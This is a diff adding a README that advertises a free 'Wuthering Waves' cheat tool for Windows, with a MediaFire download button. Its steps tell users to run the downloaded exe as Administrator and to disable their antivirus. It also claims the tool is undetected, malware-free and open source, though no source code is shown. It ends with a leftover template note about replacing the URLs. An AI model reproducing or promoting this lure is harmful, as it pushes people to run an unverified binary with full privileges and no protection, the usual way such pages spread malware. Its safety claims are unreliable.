@@ -1,0 +1,65 @@
+# Download Wuthering Waves Hack Tool 2025 - Windows Version
+
+![Logo](https://img.shields.io/badge/Wuthering_Waves-Hack-blue?logo=gamecontroller&style=for-the-badge) ![Version](https://img.shields.io/badge/Version-2.5.1-green?style=for-the-badge) ![Platform](https://img.shields.io/badge/Windows-2025-important?style=for-the-badge&logo=windows) ![Downloads](https://img.shields.io/badge/Downloads-50K+-brightgreen?style=for-the-badge)
+
+🚀 **Welcome to the ultimate Wuthering Waves Hack** – your gateway to unlocking unlimited in-game advantages! 🌟 This repository provides a **safe, undetected, and feature-packed** hack designed exclusively for Windows 2025 systems.
+
+---
+
+## 🔥 Features
+- **Unlimited Currency** 💰 – Generate gold, gems, and resources instantly!
+- **God Mode** ⚔️ – Become invincible in battles.
+- **Auto-Farm** 🤖 – Let the bot grind for you while you relax.
+- **Speed Hack** 🏃 – Move faster than ever before.
+- **No Cooldowns** ⏳ – Spam skills without delays.
+- **Stealth Mode** 🕵️ – Stay undetected by anti-cheat systems.
+
+---
+
+## 📥 Download & Install
+[![Download Now](https://img.shields.io/badge/Download-Free_Wuthering_Waves_Hack-red?style=for-the-badge&logo=download)](https://app.mediafire.com/bk4iofibrmyqg?5245DF585FA740DEAC74CB74B9C4AA81)
+
+1. **Download** the latest release using the button above.  
+2. **Extract** the ZIP file to your preferred location.  
+3. **Run** `WutheringWavesHack.exe` as Administrator.  
+4. **Launch** the game and enjoy! 🎮  
+
+⚠️ **Note:** Disable antivirus temporarily (false positives are common).  
+
+---
+
+## 🛡️ Safety & Updates
+✅ **Tested & Undetected** as of **June 2025**.  
+✅ **Regular Updates** to ensure compatibility.  
+✅ **No Malware** – Clean, open-source code.  
+
+![Status](https://img.shields.io/badge/AntiCheat_Status-Bypassed-success?style=flat-square) ![Last Updated](https://img.shields.io/badge/Last_Update-2025--06--15-yellow?style=flat-square)
+
+---
+
+## ❓ FAQ
+### ❔ Is this free?  
+✔️ **Yes!** No hidden payments or subscriptions.  
+
+### ❔ Will I get banned?  
+✔️ **Unlikely** if used sparingly. Avoid blatant abuse.  
+
+### ❔ How to report bugs?  
+📌 Open an **Issue** or join our [Discord](https://discord.gg/example) for support.  
+
+---
+
+## 📜 Legal Disclaimer
+⚠️ **This software is for educational purposes only.** Misuse may violate game TOS. Use at your own risk.  
+
+---
+
+## 🌟 Star & Support
+Enjoying the hack? **Star this repo** ⭐ and share with friends!  
+
+[![GitHub Stars](https://img.shields.io/github/stars/username/repo?style=social)](https://github.com/username/repo)  
+
+🔗 **Credits:** [Unreal Engine](https://www.unrealengine.com) | [ImgShields](https://shields.io)  
+```  
+
+*Note: Replace `Download Wuthering Waves Hack Tool 2025 - Windows Version`, `https://app.mediafire.com/bk4iofibrmyqg?0D87208791CB44A38F14D064A47A0AE8`, and placeholder URLs (Discord/GitHub) with actual values.*
